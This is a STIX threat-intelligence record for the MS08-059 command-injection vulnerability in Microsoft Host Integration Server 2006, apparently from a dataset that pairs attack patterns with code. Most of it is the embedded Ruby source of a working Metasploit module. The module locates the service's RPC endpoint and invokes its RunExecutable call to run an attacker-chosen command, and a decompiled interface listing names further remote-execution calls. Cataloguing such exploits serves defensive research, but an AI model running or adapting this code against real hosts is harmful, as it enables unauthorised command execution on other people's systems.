{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dbef074c-50cd-43da-a313-4292dc30d6ef",
    "created": "2024-08-14T16:22:56.175772Z",
    "modified": "2024-08-14T16:22:56.175776Z",
    "name": "Microsoft Host Integration Server 2006 Command Execution Vulnerability",
    "description": " This module exploits a command-injection vulnerability in Microsoft Host Integration Server 2006.  'DefaultOptions' => { 'DCERPC::ReadTimeout' => 300 # Long-running RPC calls ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/ms/ms08_059_his2006.rb",
            "external_id": "ms08_059_his2006.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3466"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=745"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DCERPC\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Host Integration Server 2006 Command Execution Vulnerability',\n      'Description'    => %q{\n          This module exploits a command-injection vulnerability in Microsoft Host Integration Server 2006.\n      },\n      'DefaultOptions' =>\n        {\n          'DCERPC::ReadTimeout' => 300 # Long-running RPC calls\n        },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'MSB', 'MS08-059' ],\n          [ 'CVE', '2008-3466' ],\n          [ 'OSVDB', '49068' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=745' ],\n        ],\n      'DisclosureDate' => '2008-10-14'))\n\n      register_options(\n        [\n        Opt::RPORT(0),\n        OptString.new('COMMAND', [ true, 'The command to execute', 'cmd.exe']),\n        OptString.new('ARGS', [ true, 'The arguments to the command', '/c echo metasploit > metasploit.txt'])\n        ])\n  end\n\n  def run\n\n    dport = datastore['RPORT'].to_i\n\n    if (dport != 0)\n      print_status(\"Could not use automatic target when the remote port is given\");\n      return\n    end\n\n    if (dport == 0)\n\n      dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.0', 'ncacn_ip_tcp')\n      dport ||= dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.1', 'ncacn_ip_tcp')\n\n      if (not dport)\n        print_status(\"Could not determine the RPC port used by the Service.\")\n        return\n      end\n\n        print_status(\"Discovered Host Integration Server RPC service on port #{dport}\")\n    end\n\n    connect(true, { 'RPORT' => dport })\n\n    dcerpc_handle('ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])\n    print_status(\"Binding to #{handle} ...\")\n\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    cmd =  NDR.string(\"#{datastore['COMMAND']}\") + NDR.string(\"#{datastore['ARGS']}\")\n\n    print_status(\"Sending command: #{datastore['COMMAND']} #{datastore['ARGS']}\")\n\n      begin\n        dcerpc_call(0x01, cmd)\n        rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      end\n\n    disconnect\n\n  end\nend\n\n=begin\n/*\n * IDL code generated by mIDA v1.0.8\n * Copyright (C) 2006, Tenable Network Security\n * http://cgi.tenablesecurity.com/tenable/mida.php\n *\n *\n * Decompilation information:\n * RPC stub type: inline\n */\n\n[\n uuid(ed6ee250-e0d1-11cf-925a-00aa00c006c1),\n version(1.1)\n]\n\ninterface mIDA_interface\n{\n\nunknown _SnaRpcService_PingServer (\n);\n\n\n/* opcode: 0x01, address: 0x01002CBB */\n\nsmall   _SnaRpcService_RunExecutable (\n [in][string] char arg_1,\n [in][string] char arg_2\n);\n\n/* opcode: 0x02, address: 0x01002F0B */\n\nlong   _SnaRpcService_CallRemoteDll (\n [in] long  arg_1,\n [in][size_is(arg_1)] byte arg_2[],\n [in] long  arg_3,\n [in][size_is(arg_1)] byte arg_4[]\n);\n\nunknown _SnaRpcService_GetInstalledDrives (\n);\n\nunknown _SnaRpcService_ServiceTableUpdate (\n);\n\n\n/* opcode: 0x05, address: 0x0100363C */\n\nlong   _SnaRpcService_GetWindowsVersion (\n [in] long  arg_1,\n [in, out][size_is(arg_1)] byte arg_2[]\n);\n\n\n/* opcode: 0x06, address: 0x01003942 */\n\nsmall   _SnaRpcService_RunExecutableEx (\n [in][string] char arg_1,\n [in][string] char arg_2,\n [in][string] char arg_3\n);\n\n\n/* opcode: 0x07, address: 0x01003BAB */\n\nlong   _SnaRpcService_GetDLCMediaType (\n [in][string] char arg_1,\n [out][ref] long * arg_2\n);\n\n\n/* opcode: 0x08, address: 0x01003E29 */\n\nsmall   _SnaRpcService_UserHasAccess (\n [in] long  arg_1\n);\n\n\n/* opcode: 0x09, address: 0x01004061 */\n\nsmall   _SnaRpcService_ConfigureHisService (\n [in][string] char arg_1\n);\n\n\n/* opcode: 0x0A, address: 0x01004272 */\n\nsmall   _SnaRpcService_ConfigureServiceAccount (\n [in][string] char arg_1\n);\n\n}\n=end\n",
    "x_mitre_disclosure_date": "2008-10-14"
}